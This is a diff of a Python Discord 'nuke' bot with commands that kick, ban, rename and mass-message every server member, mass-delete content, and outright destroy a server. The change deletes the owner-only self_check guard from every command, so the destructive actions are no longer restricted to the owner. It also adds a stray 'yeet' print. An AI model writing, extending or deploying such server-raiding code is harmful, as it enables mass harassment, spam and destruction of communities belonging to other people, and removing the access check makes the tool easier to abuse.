@@ -19,23 +19,12 @@ async def on_ready():
     print("Ready to be innocent.")
 
 
-async def self_check(ctx):
-    """
-    A secondary check to ensure nobody but the owner can run these commands
-    """
-    if bot.user.id == ctx.message.author.id:
-        return True
-
-    else:
-        return False
-
-
-@commands.check(self_check)
-@bot.command(pass_context=True)
+@bot.command()
 async def kall(ctx):
     """
     Kicks every member in a server
     """
+    print("yeet")
     await ctx.message.delete()
     for user in list(ctx.guild.members):
         try:
@@ -48,8 +37,7 @@ async def kall(ctx):
     print("Action Completed: kall")
 
 
-@commands.check(self_check)
-@bot.command(pass_context=True)
+@bot.command()
 async def ball(ctx):
     """
     Bans every member in a server
@@ -66,8 +54,7 @@ async def ball(ctx):
     print("Action Completed: ball")
 
 
-@commands.check(self_check)
-@bot.command(pass_context=True)
+@bot.command()
 async def rall(ctx, rename_to):
     """
     Renames every member in a server
@@ -84,8 +71,7 @@ async def rall(ctx, rename_to):
     print("Action Completed: rall")
 
 
-@commands.check(self_check)
-@bot.command(pass_context=True)
+@bot.command()
 async def mall(ctx, *, message):
     """
     Messages every member in a server
@@ -102,8 +88,7 @@ async def mall(ctx, *, message):
     print("Action Completed: mall")
 
 
-@commands.check(self_check)
-@bot.command(pass_context=True)
+@bot.command()
 async def dall(ctx, condition):
     """
     Can perform multiple actions that envolve mass deleting
@@ -167,8 +152,7 @@ async def dall(ctx, condition):
         print("Action Completed: dall all")
 
 
-@commands.check(self_check)
-@bot.command(pass_context=True)
+@bot.command()
 async def destroy(ctx):
     """
     Outright destroys a server
